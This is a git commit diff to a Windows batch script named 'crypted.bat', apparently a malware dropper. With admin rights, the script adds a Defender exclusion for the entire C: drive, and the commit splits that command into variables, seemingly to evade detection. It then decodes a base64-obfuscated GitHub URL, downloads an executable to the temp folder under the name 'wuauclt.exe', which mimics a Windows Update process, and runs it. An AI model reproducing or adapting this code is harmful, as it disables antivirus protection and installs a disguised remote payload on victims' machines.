597a3cbb35a74a7f4f8b89256ddca5d99a8a69e0
vault053009-maker <vault053009@gmail.com>
2025-10-02 22:24:57 -0700

    Add files via upload

--- crypted.bat
+++ crypted.bat
@@ -43,11 +43,14 @@ if %adminCheck% == 1 (
     )
     
     setlocal
-    set "defenderCmd=Add-MpPreference -ExclusionPath 'C:\'"
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "%defenderCmd%"
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
     set "downloadCmd=$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
+    set "a1=Add-MpPreference"
+    set "a2=-ExclusionPath"
+    set "a3='C:\'"
+    set "defenderCmd=%a1% %a2% %a3%"
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "%defenderCmd%"
     powershell -Command "%downloadCmd%"
     start "" "%exeFile%"
     endlocal
